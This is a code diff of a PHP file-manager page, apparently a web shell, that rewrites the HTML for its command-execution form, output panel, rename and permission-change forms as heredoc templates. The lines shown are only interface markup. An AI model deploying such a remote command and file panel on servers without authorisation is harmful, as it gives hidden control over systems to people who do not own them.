-    echo '<button type="submit" class="flex items-center justify-center px-5 py-3 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium whitespace-nowrap">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>';
-    echo 'Execute';
-    echo '</button>';
-    echo '</div>';
-    echo '</form>';
+HTML;
 
-    // Output section
     if (!empty($output)) {
-        echo '<div class="mt-4">';
-        echo '<div class="flex items-center mb-3">';
-        echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-2">';
-        echo '<svg class="h-4 w-4 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
-        echo '</div>';
-        echo '<h3 class="font-semibold text-on-surface">Output</h3>';
-        echo '</div>';
-        echo '<div class="bg-surface-container-highest text-primary p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">';
-        echo '<pre class="whitespace-pre-wrap">' . htmlspecialchars($output) . '</pre>';
-        echo '</div>';
-        echo '</div>';
+        $outputEsc = htmlspecialchars($output);
+        echo <<<HTML
+            <div class="mt-4">
+                <div class="flex items-center mb-3">
+                    <div class="p-1.5 bg-surface-container-high rounded-lg mr-2">
+                        <svg class="h-4 w-4 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                    </div>
+                    <h3 class="font-semibold text-on-surface">Output</h3>
+                </div>
+                <div class="bg-surface-container-highest text-primary p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">
+                    <pre class="whitespace-pre-wrap">$outputEsc</pre>
+                </div>
+            </div>
+HTML;
     } else {
-        echo '<div class="p-6 bg-surface-container border border-outline-variant rounded-xl text-center">';
-        echo '<div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-surface-container-high mb-3">';
-        echo '<svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>';
-        echo '</div>';
-        echo '<p class="text-on-surface-variant">Enter a command and press Execute</p>';
-        echo '</div>';
+        echo <<<HTML
+            <div class="p-6 bg-surface-container border border-outline-variant rounded-xl text-center">
+                <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-surface-container-high mb-3">
+                    <svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                    </svg>
+                </div>
+                <p class="text-on-surface-variant">Enter a command and press Execute</p>
+            </div>
+HTML;
     }
 
-    echo '</div>';
-    echo '</div>';
-    echo '</div>';
+    echo <<<HTML
+        </div>
+    </div>
+</div>
+HTML;
 }
 
 function renameFile(string $file): void
@@ -642,54 +689,56 @@ function displayRenameForm(string $file): void
 {
     $dirname = dirname($file);
     $isDir = is_dir($file);
+    $currentName = htmlspecialchars(basename($file));
+    $dirnameEnc = encryptPath($dirname);
+    $typeLabel = $isDir ? 'Directory' : 'File';
 
-    echo '<div class="max-w-lg mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo <<<HTML
+<div class="max-w-lg mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
+                    </svg>
+                </div>
+                Rename $typeLabel
+            </h2>
+        </div>
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path></svg>';
-    echo '</div>';
-    echo 'Rename ' . ($isDir ? 'Directory' : 'File');
-    echo '</h2>';
-    echo '</div>';
+        <form method="post">
+            <div class="p-4 sm:p-6 space-y-4">
+                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
+                    <span class="text-sm text-on-surface-variant">Current name:</span>
+                    <span class="ml-2 text-sm font-medium text-on-surface break-all">$currentName</span>
+                </div>
 
-    echo '<form method="post">';
+                <div>
+                    <label class="block text-sm font-medium text-on-surface mb-2">New Name</label>
+                    <input type="text" name="newname" value="$currentName" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required>
+                </div>
+            </div>
 
-    echo '<div class="p-4 sm:p-6 space-y-4">';
+            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    Rename
+                </button>
 
-    // Current name
-    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
-    echo '<span class="text-sm text-on-surface-variant">Current name:</span>';
-    echo '<span class="ml-2 text-sm font-medium text-on-surface break-all">' . htmlspecialchars(basename($file)) . '</span>';
-    echo '</div>';
-
-    // New name
-    echo '<div>';
-    echo '<label class="block text-sm font-medium text-on-surface mb-2">New Name</label>';
-    echo '<input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required>';
-    echo '</div>';
-
-    echo '</div>';
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
-    echo 'Rename';
-    echo '</button>';
-
-    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
-    echo 'Cancel';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</form>';
-    echo '</div>';
-    echo '</div>';
+                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                    Cancel
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
+HTML;
 }
 
 function chmodFile(string $file): void
@@ -721,64 +770,64 @@ function displayChmodForm(string $file): void
     $dirname = dirname($file);
     $isDir = is_dir($file);
     $currentPerms = substr(sprintf('%o', fileperms($file)), -4);
+    $baseName = htmlspecialchars(basename($file));
+    $dirnameEnc = encryptPath($dirname);
 
-    echo '<div class="max-w-lg mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo <<<HTML
+<div class="max-w-lg mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                </div>
+                Change Permissions
+            </h2>
+        </div>
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>';
-    echo '</div>';
-    echo 'Change Permissions';
-    echo '</h2>';
-    echo '</div>';
+        <form method="post">
+            <div class="p-4 sm:p-6 space-y-4">
+                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant space-y-1">
+                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">File:</span><span class="text-sm font-medium text-on-surface truncate max-w-[200px]" title="$baseName">$baseName</span></div>
+                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">Current:</span><span class="text-sm font-mono font-medium text-primary">$currentPerms</span></div>
+                </div>
 
-    echo '<form method="post">';
+                <div>
+                    <label class="block text-sm font-medium text-on-surface mb-2">New Permissions (octal)</label>
+                    <input type="text" name="permission" value="$currentPerms" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl font-mono focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">
+                </div>
 
-    echo '<div class="p-4 sm:p-6 space-y-4">';
+                <div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl text-sm">
+                    <p class="font-semibold text-on-surface mb-2">Common permissions:</p>
+                    <div class="space-y-2">
+                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0755</span><span class="text-on-surface-variant">Directory (drwxr-xr-x)</span></div>
+                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0644</span><span class="text-on-surface-variant">File (-rw-r--r--)</span></div>
+                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0777</span><span class="text-on-surface-variant">Full access</span></div>
+                    </div>
+                </div>
+            </div>
 
-    // File info
-    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant space-y-1">';
-    echo '<div class="flex justify-between"><span class="text-sm text-on-surface-variant">File:</span><span class="text-sm font-medium text-on-surface truncate max-w-[200px]" title="' . htmlspecialchars(basename($file)) . '">' . htmlspecialchars(basename($file)) . '</span></div>';
-    echo '<div class="flex justify-between"><span class="text-sm text-on-surface-variant">Current:</span><span class="text-sm font-mono font-medium text-primary">' . $currentPerms . '</span></div>';
-    echo '</div>';
+            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    Change
+                </button>
 
-    // New permissions
-    echo '<div>';
-    echo '<label class="block text-sm font-medium text-on-surface mb-2">New Permissions (octal)</label>';
-    echo '<input type="text" name="permission" value="' . $currentPerms . '" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl font-mono focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">';
-    echo '</div>';
-
-    // Permission explanation
-    echo '<div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl text-sm">';
-    echo '<p class="font-semibold text-on-surface mb-2">Common permissions:</p>';
-    echo '<div class="space-y-2">';
-    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0755</span><span class="text-on-surface-variant">Directory (drwxr-xr-x)</span></div>';
-    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0644</span><span class="text-on-surface-variant">File (-rw-r--r--)</span></div>';
-    echo '<div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0777</span><span class="text-on-surface-variant">Full access</span></div>';
-    echo '</div>';
-    echo '</div>';
-
-    echo '</div>';
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
-    echo 'Change';
-    echo '</button>';
-
-    echo '<a href="?cd=' . encryptPath($dirname) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
-    echo 'Cancel';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</form>';
-    echo '</div>';
-    echo '</div>';
+                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                    Cancel
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
+HTML;
 }
 
 function deleteFile(string $file): bool
@@ -1203,7 +1252,6 @@ $currentTime = date('Y-m-d H:i:s');
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="ophellia.css">
     <?php
-    // Theme configuration based on THEME constant
     $themeColors = THEME === 'dark' ? [
         'background' => '#1A110F',
         'surface' => '#1A110F',
